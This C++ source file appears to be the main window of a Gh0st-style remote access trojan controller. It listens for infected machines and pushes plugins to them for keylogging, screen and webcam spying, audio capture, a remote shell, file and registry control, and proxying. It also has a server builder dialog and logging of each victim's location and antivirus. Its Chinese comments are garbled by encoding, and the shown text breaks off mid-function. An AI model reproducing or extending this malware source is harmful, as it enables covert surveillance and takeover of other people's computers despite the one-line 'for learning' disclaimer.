// MainFrm.cpp : implementation of the CMainFrame class
//

#include "stdafx.h"
#include "Client.h"
#include "ClientView.h"
#include "MainFrm.h"
#include "PcView.h"
#include "SettingDlg.h"
#include "FileManagerDlg.h"
#include "ScreenSpyDlg.h"
#include "WebCamDlg.h"
#include "ShellDlg.h"
#include "AudioDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "LocalUpload.h"
#include "KeyBoardDlg.h"
#include "ServiceDlg.h"
#include "RegeditDlg.h"
#include "TextChatDlg.h"
#include "ProxyMapDlg.h"
#include "LogView.h"
#include "Mydat.h"
#include "Dialogbar.h"

#include "..\DLL\Plugins\C_FILE.h"
#include "..\DLL\Plugins\C_SHELL.h"
#include "..\DLL\Plugins\C_SCREEN.h"
#include "..\DLL\Plugins\C_VIDEO.h"
#include "..\DLL\Plugins\C_LISTEN.h"
#include "..\DLL\Plugins\C_SYSTEM.h"
#include "..\DLL\Plugins\C_KEYLOG.h"
#include "..\DLL\Plugins\C_SERVICE.h"
#include "..\DLL\Plugins\C_REGEDIT.h"
#include "..\DLL\Plugins\C_CHAT.h"
#include "..\DLL\Plugins\C_PROXYMAP.h"


#define WM_SYSTRAY						WM_USER+100
#define WM_ICONMESSAGE					WM_USER+100

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

CMainFrame	*g_pFrame;
CIOCPServer * m_iocpServer = NULL;
extern CClientView* g_pTabView; 
extern HMODULE hModule_shell32;
extern CLogView* g_pLogView;
extern CDialogbar * pInfoMation;


LPBYTE lpFilePacket = NULL;
LPBYTE lpShellPacket = NULL;
LPBYTE lpScreenPacket = NULL;
LPBYTE lpWebCamPacket = NULL;
LPBYTE lpAudioPacket = NULL;
LPBYTE lpSystemPacket = NULL;
LPBYTE lpKeyboardPacket = NULL;
LPBYTE lpServicePacket = NULL;
LPBYTE lpRegeditPacket = NULL;
LPBYTE lpTextChatPacket = NULL;
LPBYTE lpProxyMapPacket = NULL;
int nFilePacketLength = 0;
int nShellPacketLength = 0;
int nScreenPacketLength = 0;
int nWebCamPacketLength = 0;
int nAudioPacketLength = 0;
int nSystemPacketLength = 0;
int nKeyboardPacketLength = 0;
int nServicePacketLength = 0;
int nRegeditPacketLength = 0;
int nTextChatPacketLength = 0;
int nProxyPacketLength = 0;



/////////////////////////////////////////////////////////////////////////////
// CMainFrame

IMPLEMENT_DYNCREATE(CMainFrame, CXTPFrameWnd)

BEGIN_MESSAGE_MAP(CMainFrame, CXTPFrameWnd)
	//{{AFX_MSG_MAP(CMainFrame)
	ON_WM_CREATE()
	ON_WM_SYSCOMMAND()
	ON_COMMAND(ID_MENUITEM_SHOW, OnMenuitemShow)
	ON_COMMAND(ID_MENUITEM_HIDE, OnMenuitemHide)
	ON_WM_CLOSE()
	ON_WM_TIMER()
	ON_COMMAND(ID_MENUITEM_SETTING, OnMenuitemSetting)
	ON_COMMAND(ID_MENUITEM_BUILD, OnMenuitemBuild)
	ON_WM_TIMER()
	ON_WM_SYSCOMMAND()
	//}}AFX_MSG_MAP
	//ON_COMMAND(XTP_ID_CUSTOMIZE, OnCustomize)
	ON_MESSAGE(WM_REMOVEFROMLIST, OnRemoveFromList)
	ON_MESSAGE(WM_OPENMANAGERDIALOG, OnOpenManagerDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenWebCamDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENPSLISTDIALOG, OnOpenSystemDialog)
    ON_MESSAGE(WM_OPENBUILDDIALOG, OnOpenBuildDialog)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyBoardDialog)
	ON_MESSAGE(WM_OPENSERVICEDIALOG, OnOpenServiceDialog)
	ON_MESSAGE(WM_OPENREGEDITDIALOG, OnOpenRegeditDialog)
	ON_MESSAGE(WM_OPENTEXTCHATDIALOG, OnOpenTextChatDialog)
	ON_MESSAGE(WM_OPENPROXYMAPDIALOG, OnOpenProxyMapDialog) 
	ON_MESSAGE(WM_MODIFYLIST, OnModifyList)
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)	
	ON_MESSAGE(XTPWM_DOCKINGPANE_NOTIFY, OnDockingPaneNotify)
	ON_MESSAGE(WM_OPENTEMPSYSINFO, OnOpenTempSysInfoDialog)
    END_MESSAGE_MAP()

static UINT indicators[] =
{
	ID_STAUTS_OS,	// ����ͳ��
	ID_STAUTSSPEED,	// �ϴ������ٶ�
	ID_STAUTS_PORT,
	ID_INDICATOR_CAPS,
	ID_INDICATOR_NUM,
	ID_INDICATOR_SCRL,


};

/////////////////////////////////////////////////////////////////////////////
// CMainFrame construction/destruction

CMainFrame::CMainFrame()
{
	// TODO: add member initialization code here
	g_pFrame = this;
    memset(nOSCount,0,sizeof(nOSCount)); 
}

CMainFrame::~CMainFrame()
{
}


int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	if (CXTPFrameWnd::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	//���������ʾ
	this ->CenterWindow(CWnd::GetDesktopWindow());
	
	// ��ʼ�� command bars
	if (!InitCommandBars())
		return -1;
	
	// ��ȡ command bars Ŀ�� ָ��
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if(pCommandBars == NULL)
	{
		TRACE0("Failed to create command bars object.\n");
		return -1;      // fail to create
	}
	
	if (!m_TrayIcon.Create(_T("����: 0"), // Toolktip text  ���ϵͳ����
		this,                       // Parent window
		IDR_MAINFRAME,               // Icon resource ID
		IDR_MENU_TRAY,             // Resource ID of popup menu
		ID_MENUITEM_SHOW ,               // Default menu item for popup menu
		false
		))                     // True if default menu item is located by position
	{
		TRACE0("Failed to create tray icon\n");
		return -1;
	}
   	//SetMenu(NULL);//ȥ���˵�
//////////////////////////////////////////////////////////
	// CXTPToolBar* pCommandBar = (CXTPToolBar*)pCommandBars->Add(_T("��������"), xtpBarTop);
	// if (!pCommandBar ||
	// 	!pCommandBar->LoadToolBar(IDR_TOOLBAR3))
	// {
	// 	TRACE0("Failed to create toolbar\n");
	// 	return -1;
	// }
	// CImageList m_imagelist;
	// m_imagelist.Create(24,24,ILC_COLOR24|ILC_MASK,0,0);
    // CBitmap bmp;
	// bmp.LoadBitmap(IDB_TOOLBAR);
	// m_imagelist.Add(&bmp,RGB(255,255,255));
	// CXTPCommandBarsOptions* pOptions = pCommandBars->GetCommandBarsOptions();
	// pOptions->bShowExpandButtonAlways = FALSE;
	// pOptions->bShowTextBelowIcons = TRUE;
	// pOptions->bLargeIcons = FALSE;
	// pCommandBar->ModifyBarStyle(CBRS_GRIPPER,0);
	// pCommandBar->EnableDocking(xtpFlagStretched);
	// pCommandBar->GetImageManager()->SetIcons(IDR_TOOLBAR3,m_imagelist);
	RedrawWindow(0, 0, RDW_INVALIDATE|RDW_UPDATENOW|RDW_ERASE|RDW_ALLCHILDREN);   
	GetCommandBars()->GetPaintManager()->RefreshMetrics(); 

// 

	
	// ���״̬��
	if (!m_wndStatusBar.Create(this) ||
		!m_wndStatusBar.SetIndicators(indicators,
		sizeof(indicators)/sizeof(UINT)))
	{
		TRACE0("Failed to create status bar\n");
		return -1;      // fail to create
	}
	
	//��������״̬��
	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 200);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 70);

	pCommandBars->GetCommandBarsOptions()->bShowTextBelowIcons = TRUE;
	pCommandBars->GetCommandBarsOptions()->ShowKeyboardCues(xtpKeyboardCuesShowWindowsDefault);
	XTPColorManager()->DisableLunaColors(TRUE);
	pCommandBars->SetTheme(xtpThemeNativeWinXP); //������
	
	CXTPPaintManager::SetTheme(xtpThemeOffice2003); //������־�Ի�������
	CXTPPaintManager::SetTheme(xtpThemeOffice2003); //������־�Ի�������
	m_paneManager.InstallDockingPanes(this);
	m_paneManager.SetTheme(xtpPaneThemeVisualStudio2005);
	// 	// ����֮ǰ�Ĺ������Ͳ˵���
	// 	LoadCommandBars(_T("CommandBars"));
// 	SetTimer(0, 1000, NULL);  //������ʱ�� 1

    	CXTPDockingPane* pwndPaneLog = CreatePane(235, 100, RUNTIME_CLASS(CLogView), _T("��Ϣ"), xtpPaneDockBottom);
	 	pwndPaneLog->Select();
	 	pwndPaneLog->SetOptions(xtpPaneNoCaption);
	 	m_paneManager.ShowPane(pwndPaneLog, 1);	
// 		// ��ʼ������ڴ�
//direction parameter can be one of the following: 

// ?xtpPaneDockTop: Docks the pane to the top of the neighbor.
// ?xtpPaneDockLeft: Docks the pane to the left of the neighbor.
// ?xtpPaneDockRight: Docks the pane to the right of the neighbor.
// ?xtpPaneDockBottom: Docks the pane to the bottom of the neighbor.
	
		// File
		nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
		lpFilePacket = new BYTE[nFilePacketLength];
		if(lpFilePacket == NULL)
		{
			AfxMessageBox("��ʼ��File���ʧ�ܣ�");
		}
		else
		{
			lpFilePacket[0] = COMMAND_LIST_DRIVE;
			memcpy(lpFilePacket + 1, (void*)FILEMyFileBuf, nFilePacketLength - 1);
		}
	
		// Shell
		nShellPacketLength = (SHELLMyFileSize + 1)*sizeof(char)+1;
		lpShellPacket = new BYTE[nShellPacketLength];
		if(lpShellPacket == NULL)
		{
			AfxMessageBox("��ʼ��shell���ʧ�ܣ�");
		}
		else
		{
			lpShellPacket[0] = COMMAND_SHELL;
			memcpy(lpShellPacket + 1, (void*)SHELLMyFileBuf, nShellPacketLength - 1);
		}

	// ��Ļ
	nScreenPacketLength = (SCREENMyFileSize + 1)*sizeof(char)+1;
	lpScreenPacket = new BYTE[nScreenPacketLength];
	if(lpScreenPacket == NULL)
	{
		AfxMessageBox("��ʼ��Screen���ʧ�ܣ�");
	}
	else
	{
 		lpScreenPacket[0] = COMMAND_SCREEN_SPY;
    	memcpy(lpScreenPacket + 1, (void*)SCREENMyFileBuf, nScreenPacketLength - 1);
	}

	// webcam
	nWebCamPacketLength = (VIDEOMyFileSize + 1)*sizeof(char)+1;
	lpWebCamPacket = new BYTE[nWebCamPacketLength];
	if(lpWebCamPacket == NULL)
	{
		AfxMessageBox("��ʼ��WebCam���ʧ�ܣ�");
	}
	else
	{
		lpWebCamPacket[0] = COMMAND_WEBCAM;
		memcpy(lpWebCamPacket + 1, (void*)VIDEOMyFileBuf, nWebCamPacketLength - 1);
	}

	// Audio
	nAudioPacketLength = (LISTENMyFileSize + 1)*sizeof(char)+1;
	lpAudioPacket = new BYTE[nAudioPacketLength];
	if(lpAudioPacket == NULL)
	{
		AfxMessageBox("��ʼ��Audio���ʧ�ܣ�");
	}
	else
	{
		lpAudioPacket[0] = COMMAND_AUDIO;
		memcpy(lpAudioPacket + 1, (void*)LISTENMyFileBuf, nAudioPacketLength - 1);
	}

	// System
	nSystemPacketLength = (SYSTEMMyFileSize + 1)*sizeof(char)+1;
	lpSystemPacket = new BYTE[nSystemPacketLength];
	if(lpSystemPacket == NULL)
	{
		AfxMessageBox("��ʼ��System���ʧ�ܣ�");
	}
	else
	{
		lpSystemPacket[0] = COMMAND_SYSTEM;
		memcpy(lpSystemPacket + 1, (void*)SYSTEMMyFileBuf, nSystemPacketLength - 1);
	}



	// Service
	nServicePacketLength = (SERVICEMyFileSize + 1)*sizeof(char)+1;
	lpServicePacket = new BYTE[nServicePacketLength];
	if(lpServicePacket == NULL)
	{
		AfxMessageBox("��ʼ��Service���ʧ�ܣ�");
	}
	else
	{
		lpServicePacket[0] = COMMAND_SERVICE_MANAGER;
		memcpy(lpServicePacket + 1, (void*)SERVICEMyFileBuf, nServicePacketLength - 1);
	}

	// Regedit
	nRegeditPacketLength = (REGEDITMyFileSize + 1)*sizeof(char)+1;
	lpRegeditPacket = new BYTE[nRegeditPacketLength];
	if(lpRegeditPacket == NULL)
	{
		AfxMessageBox("��ʼ��Regedit���ʧ�ܣ�");
	}
	else
	{
		lpRegeditPacket[0] = COMMAND_REGEDIT;
		memcpy(lpRegeditPacket + 1, (void*)REGEDITMyFileBuf, nRegeditPacketLength - 1);
	}


	// TextChat
	nTextChatPacketLength = (CHATMyFileSize + 1)*sizeof(char)+1;
	lpTextChatPacket = new BYTE[nTextChatPacketLength];
	if(lpTextChatPacket == NULL)
	{
		AfxMessageBox("��ʼ��TextChat���ʧ�ܣ�");
	}
	else
	{
		lpTextChatPacket[0] = COMMAND_TEXT_CHAT;
		memcpy(lpTextChatPacket + 1, (void*)CHATMyFileBuf, nTextChatPacketLength - 1);
	}


	// ProxyMap
	nProxyPacketLength = (PROXYMAPMyFileSize + 1)*sizeof(char)+1;
	lpProxyMapPacket = new BYTE[nProxyPacketLength];
	if(lpProxyMapPacket == NULL)
	{
		AfxMessageBox("��ʼ��ProxyMap���ʧ�ܣ�");
	}
	else
	{
		lpProxyMapPacket[0] = COMMAND_PROXY_MAP;
    	memcpy(lpProxyMapPacket + 1, (void*)PROXYMAPMyFileBuf, nProxyPacketLength - 1);
	}

	return 0;
}

BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
	if( !CXTPFrameWnd::PreCreateWindow(cs) )
		return FALSE;
	// TODO: Modify the Window class or styles here by modifying
	//  the CREATESTRUCT cs
	cs.lpszClass = _T("XTPMainFrame");
	CXTPDrawHelpers::RegisterWndClass(AfxGetInstanceHandle(), cs.lpszClass, 
		CS_DBLCLKS, AfxGetApp()->LoadIcon(IDR_MAINFRAME));
	cs.cx =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Width",  1210);
	cs.cy =  ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("CLIENT", "Hight",  500);
	
	cs.dwExStyle&=~WS_EX_CLIENTEDGE;
	cs.style &= ~FWS_ADDTOTITLE;
	// �����ڱ���
	cs.lpszName = _T("���Ե������С�����");

	return TRUE;
}

/////////////////////////////////////////////////////////////////////////////
// CMainFrame diagnostics

#ifdef _DEBUG
void CMainFrame::AssertValid() const
{
	CXTPFrameWnd::AssertValid();
}

void CMainFrame::Dump(CDumpContext& dc) const
{
	CXTPFrameWnd::Dump(dc);
}

#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMainFrame message handlers
//void CMainFrame::OnPopup() {}

// �����������
void CMainFrame::Activate(int nPort, int nMaxConnections)
{
	//�ж����m_iocpServerȫ�ֱ����Ƿ��Ѿ�ָ����һ��CIOCPServer
	if (m_iocpServer != NULL)
	{
		//������ǵĻ�����Ҫ�ȹر���������ɾ�������CIOCPServer��ռ���ڴ�ռ�
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}
	m_iocpServer = new CIOCPServer;
	// ��ʼ����
	m_iocpServer->m_nHeartBeatTime = ((CClientApp *)AfxGetApp())->m_IniFile.GetInt("Settings", "HeartBeatTime", 0);

	CString str,IP,strLogText;
	str.Format("ע�⣡�����ѧϰʹ��");
	g_pLogView->InsertLogItem( str, 0, 0 );

	// ����IPCP������
 	if (m_iocpServer->Initialize(NotifyProc, nMaxConnections, nPort))
 	{

		char hostname[256]; 
		memset(hostname,0,256);
 		gethostname(hostname, sizeof(hostname));
		HOSTENT *host = gethostbyname(hostname);
			
		if (host != NULL)
		{
			for ( int i=0; ; i++ )
			{ 
				IP += inet_ntoa(*(IN_ADDR*)host->h_addr_list[i]);
				if ( host->h_addr_list[i] + host->h_length >= host->h_name )
					break;
				IP += "/";
			}
		}	
		else
			IP = _T("127.0.0.1");

		str.Format("�˿�:%d",nPort);
	    m_wndStatusBar.SetPaneText(2, str);
		strLogText.Format( "�˿�: [ %d ]  �ɹ�", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 4 );

 	}
	else
	{
		IP.Format(_T("�˿� %d ����ʧ��"), nPort);
		UpdateWindow();

		m_wndStatusBar.SetPaneText(2, "�˿�:0");
		strLogText.Format( "�˿�: [ %d ]  ʧ��", nPort );
		g_pLogView->InsertLogItem( strLogText, 0, 5 );
	}

	
    SetWindowText("CK��ȫ���μ�  www.ckhack.com");
 	m_wndStatusBar.SetPaneText(0, _T("����: 0"));
}

void CALLBACK CMainFrame::NotifyProc( ClientContext *pContext, UINT nCode )
{
	switch (nCode)
	{
	case NC_CLIENT_CONNECT:
		break;
	case NC_CLIENT_DISCONNECT:
		g_pFrame->PostMessage(WM_REMOVEFROMLIST, 0, (LPARAM)pContext);
		break;
	case NC_TRANSMIT:
		break;
	case NC_RECEIVE:
		ProcessReceive(pContext);
		break;
	case NC_RECEIVE_COMPLETE:
		ProcessReceiveComplete(pContext);
		break;
	default:
		break;
	}
}

void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
{
	if (pContext == NULL)
		return;

	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
			((CFileManagerDlg *)dlg)->OnReceiveComplete();
			break;
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
			break;
		case SHELL_DLG:
			((CShellDlg *)dlg)->OnReceiveComplete();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceiveComplete();
			break;
		case AUDIO_DLG:
			((CAudioDlg *)dlg)->OnReceiveComplete();
			break;
		case SYSTEM_DLG:
			((CSystemDlg *)dlg)->OnReceiveComplete();
			break;
		case KEYBOARD_DLG:
			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
			break;
		case SERVICE_DLG:
			((CServiceDlg *)dlg)->OnReceiveComplete();
			break;
		case REGEDIT_DLG:
			((CRegeditDlg *)dlg)->OnReceiveComplete();
			break;
		case CHAT_DLG:
			((CTextChatDlg *)dlg)->OnReceiveComplete();
			break;
		case PROXYMAP_DLG:
	    	((CProxyMapDlg *)dlg)->OnReceiveComplete();
			break;
		case GETDAT_DLG:
			((CMydat *)dlg)->OnReceiveComplete();//���ӹ���
			break;
		default:
			break;
		}
		return;
	}

	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_LOGIN: // ���߰�
		{
			pContext->m_bIsMainSocket = TRUE;
			g_pTabView->PostMessage(WM_ADDFINDGROUP, 0, (LPARAM)pContext);
		}
		break;
	case TOKEN_DRIVE_LIST: // �ļ����� �������б�
		// ָ�ӵ���public������ģ̬�Ի����ʧȥ��Ӧ�� ��֪����ô����,̫��
		g_pFrame->PostMessage(WM_OPENMANAGERDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_BITMAPINFO: // ��Ļ�鿴
		g_pFrame->PostMessage(WM_OPENSCREENSPYDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_WEBCAM_BITMAPINFO: // ����ͷ
		g_pFrame->PostMessage(WM_OPENWEBCAMDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_AUDIO_START: // ����
		g_pFrame->PostMessage(WM_OPENAUDIODIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SHELL_START: //��ʼCMD
		g_pFrame->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PSLIST:     // ϵͳ���� �����б�
		g_pFrame->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_FIND_YES: // ɸѡ����
		g_pFrame->PostMessage(WM_MODIFYLIST, 0, (LPARAM)pContext);
		break;
	case TOKEN_DLLINFO:
		g_pFrame->PostMessage(WM_OPENBUILDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_KEYBOARD_START:
		g_pFrame->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_SERVICE_LIST:
		g_pFrame->PostMessage(WM_OPENSERVICEDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_REGEDIT:   //ע������    
		g_pFrame->PostMessage(WM_OPENREGEDITDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEXTCHAT_START:
		g_pFrame->PostMessage(WM_OPENTEXTCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_PROXY_START:
		g_pFrame->PostMessage(WM_OPENPROXYMAPDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_CHAT_START:
		g_pFrame->PostMessage(WM_OPENCHATDIALOG, 0, (LPARAM)pContext);
		break;
	case TOKEN_GETQQNUM:
		g_pFrame->PostMessage(WM_WRITEQQNUM, 0, (LPARAM)pContext);
		break;
	case TOKEN_TEMP_SYSINFOLIST:
		g_pFrame->PostMessage(WM_OPENTEMPSYSINFO, 0, (LPARAM)pContext);
	default:
		closesocket(pContext->m_Socket);
		break;


	}	
}


// ��Ҫ��ʾ���ȵĴ���
void CMainFrame::ProcessReceive(ClientContext *pContext)
{
	if (pContext == NULL)
		return;
	// �������Ի���򿪣�������Ӧ�ĶԻ�����
	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];
	
	// �������ڴ���
	if (pContext->m_Dialog[0] > 0)
	{
		switch (pContext->m_Dialog[0])
		{
		case SCREENSPY_DLG:
			((CScreenSpyDlg *)dlg)->OnReceive();
			break;
		case WEBCAM_DLG:
			((CWebCamDlg *)dlg)->OnReceive();
			break;
		default:
			break;
		}
		return;
	}
}

void CMainFrame::ShowToolTips(LPCTSTR lpszText)
{	
	m_TrayIcon.ShowBalloonTip( lpszText, _T("������������Ϣ: "), NIIF_INFO, 10);
}

void CMainFrame::ShowConnectionsNumber()
{
	CString str,strTemp;

	int a = 0;
	CPcView* pView = NULL;
	int count = g_pTabView->m_wndTabControl.GetItemCount();
	for (int i = 0; i < count; i++)
	{	
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(i)->GetHandle()));
		a += pView->m_pListCtrl->GetItemCount();
	}

	strTemp.Format(_T("�ϼ�: %d"), a);

	str.Format(_T("Else:%d	2k:%d	XP:%d	2k3:%d	Vista:%d	2k8:%d	W7:%d	W8:%d	2k12:%d	W10:%d	2k16:%d	  %s"), 
		nOSCount[0],
		nOSCount[1], 
		nOSCount[2],
		nOSCount[3],
		nOSCount[4],
		nOSCount[5],
		nOSCount[6],
		nOSCount[7],
		nOSCount[8],
		nOSCount[9],
		nOSCount[10],
		strTemp);

	m_wndStatusBar.SetPaneText(0, str);

	UpdateData(); 

	g_pFrame->m_TrayIcon.SetTooltipText(strTemp);
}

void CMainFrame::OnCustomize()
{
	// get a pointer to the command bars object.
	CXTPCommandBars* pCommandBars = GetCommandBars();
	if (pCommandBars == NULL)
		return;
	
	// instanciate the customize dialog
	CXTPCustomizeSheet dlg(pCommandBars);
	
	// add the options page to the customize dialog.
	CXTPCustomizeOptionsPage pageOptions(&dlg);
	dlg.AddPage(&pageOptions);
	
	// add the commands page to the customize dialog.
	CXTPCustomizeCommandsPage* pPageCommands = dlg.GetCommandsPage();
	pPageCommands->AddCategories(IDR_MAINFRAME);
	
	// initialize the commands page page.
	pPageCommands->InsertAllCommandsCategory();
	pPageCommands->InsertBuiltInMenus(IDR_MAINFRAME);
	pPageCommands->InsertNewMenuCategory();
	
	// display the customize dialog.
	dlg.DoModal();
}

void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	if (nID == SC_MINIMIZE)
	{
		m_TrayIcon.MinimizeToTray(this);
		m_TrayIcon.ShowBalloonTip( _T("������С��������......"), _T(" GHOST���ٰ� "), NIIF_NONE, 10);
	}
	else
	{
		CXTPFrameWnd::OnSysCommand(nID, lParam);
	}
}

void CMainFrame::OnMenuitemShow() 
{
	// TODO: Add your command handler code here
	if (!IsWindowVisible()){
        m_TrayIcon.MaximizeFromTray(this);
	}else
		m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnMenuitemHide() 
{
	// TODO: Add your command handler code here
	m_TrayIcon.MinimizeToTray(this);
}

void CMainFrame::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
#ifdef NDEBUG
	if (MessageBox(_T("ȷ���˳�?"), _T("��ʾ"), MB_YESNO | MB_ICONQUESTION) == IDNO)
 		return;
#endif

	KillTimer(0);  //�رն�ʱ�� 

	RECT rect;
	::GetWindowRect(GetSafeHwnd(),&rect);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Width",  rect.right - rect.left);
	((CClientApp *)AfxGetApp())->m_IniFile.SetInt("CLIENT", "Hight",  rect.bottom - rect.top);
	

	SaveCommandBars("CommandBars");

	CMainFrame* pMainFrame = (CMainFrame*)AfxGetMainWnd();
	pMainFrame->m_TrayIcon.RemoveIcon();
	
	if (NULL!=m_iocpServer)
	{
		m_iocpServer->Shutdown();
		delete m_iocpServer;
	}

	if (hModule_shell32)
	{
		FreeLibrary(hModule_shell32);
	}

	if (lpFilePacket)
	{
		delete [] lpFilePacket;
	}
	if (lpShellPacket)
	{
		delete [] lpShellPacket;
	}
	if (lpScreenPacket)
	{
		delete [] lpScreenPacket;
	}
	if (lpWebCamPacket)
	{
		delete [] lpWebCamPacket;
	}
	if (lpAudioPacket)
	{
		delete [] lpAudioPacket;
	}
	if (lpSystemPacket)
	{
		delete [] lpSystemPacket;
	}
	if (lpKeyboardPacket)
	{
		delete [] lpKeyboardPacket;
	}
	if (lpServicePacket)
	{
		delete [] lpServicePacket;
	}
	if (lpRegeditPacket)
	{
		delete [] lpRegeditPacket;
	}
	if (lpTextChatPacket)
	{
		delete [] lpTextChatPacket;
	}
	if (lpProxyMapPacket)
	{
		delete [] lpProxyMapPacket;
	}

	CXTPFrameWnd::OnClose();
}


void CMainFrame::OnMenuitemSetting() 
{
	// TODO: Add your command handler code here
	CSettingDlg dlg;
	dlg.DoModal();
}

void CMainFrame::OnMenuitemBuild() 
{
	// TODO: Add your command handler code here
	CBuildDlg dlg;
	dlg.DoModal();
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////

LRESULT CMainFrame::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	
	CPcView* pView = NULL;
	CString strOSCount,strLogText;
	int nTabs = g_pTabView->m_wndTabControl.GetItemCount();
	bool bIsOk = false;
	
	// 	try
	// 	{
	for (int n = 0; n < nTabs; n++ )
	{
		pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetItem(n)->GetHandle()));
		// ɾ����������п��ܻ�ɾ��pContext (���Բ���ʹ��pContext������ݣ�˵��˵һ��) 
		
		int nCnt = pView->m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
			{
				bIsOk = true;
				strLogText.Format( "���߶Ͽ�: [%s]  -   ϵͳ:[%s]  -   ����λ��:[%s]  -   ɱ�����:[%s]",pView->m_pListCtrl->GetItemText(i, 1),pView->m_pListCtrl->GetItemText(i, 4),pView->m_pListCtrl->GetItemText(i, 0),pView->m_pListCtrl->GetItemText(i, 11));
				g_pLogView->InsertLogItem(strLogText, 0, 2);

				strOSCount = pView->m_pListCtrl->GetItemText( i, 4 );
				if ( strOSCount.Find(_T("NT")) != -1 )
				{
					g_pFrame->nOSCount[0]--;
				}
				if ( strOSCount.Find(_T("XP")) != -1 )
				{
					g_pFrame->nOSCount[2]--;
				}
				if ( strOSCount.Find(_T("Vista")) != -1 )
				{
					g_pFrame->nOSCount[4]--;
				}
				if ( strOSCount.Find(_T("Win 7")) != -1 )
				{
					g_pFrame->nOSCount[6]--;
				}
				if ( strOSCount.Find(_T("2000")) != -1 )
				{
					g_pFrame->nOSCount[1]--;
				}
				if ( strOSCount.Find(_T("2003")) != -1 )
				{
					g_pFrame->nOSCount[3]--;
				}
				if ( strOSCount.Find(_T("2008")) != -1 )
				{
					g_pFrame->nOSCount[5]--;
				}
				if ( strOSCount.Find(_T("Win 8")) != -1 )
				{
					g_pFrame->nOSCount[7]--;
				}
				if ( strOSCount.Find(_T("2012")) != -1 )
				{
					g_pFrame->nOSCount[8]--;
				}
				if ( strOSCount.Find(_T("Win 10")) != -1 )
				{
					g_pFrame->nOSCount[9]--;
				}
				if ( strOSCount.Find(_T("2016")) != -1 )
				{
					g_pFrame->nOSCount[10]--;
				}
				
				pView->m_pListCtrl->DeleteItem(i);
				
//				if (!((CClientApp *)AfxGetApp())->m_bIsWarning_Tone)
//				{
//					PlaySound(MAKEINTRESOURCE(IDR_WAVE_OFFLINE),AfxGetResourceHandle(),SND_ASYNC|SND_RESOURCE|SND_NODEFAULT);
// 				}
				break;		
			}
		}		
	}

		if(bIsOk == false)
			TRACE("û���ҵ�Ҫɾ��������\r\n");

		// �ر���ش���
		switch (pContext->m_Dialog[0])
		{ 
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case SHELL_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case SYSTEM_DLG:
		case KEYBOARD_DLG:
		case SERVICE_DLG:
		case REGEDIT_DLG:
		case CHAT_DLG:
		case PROXYMAP_DLG:
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			return 0;
		default:
			break;
		}
 		
	// 	}
	// 	catch(...)
	// 	{
	// 		TRACE("����ɾ��catch\r\n");
	// 	}
	
	// ���µ�ǰ��������
	g_pTabView->UpDateNumber();
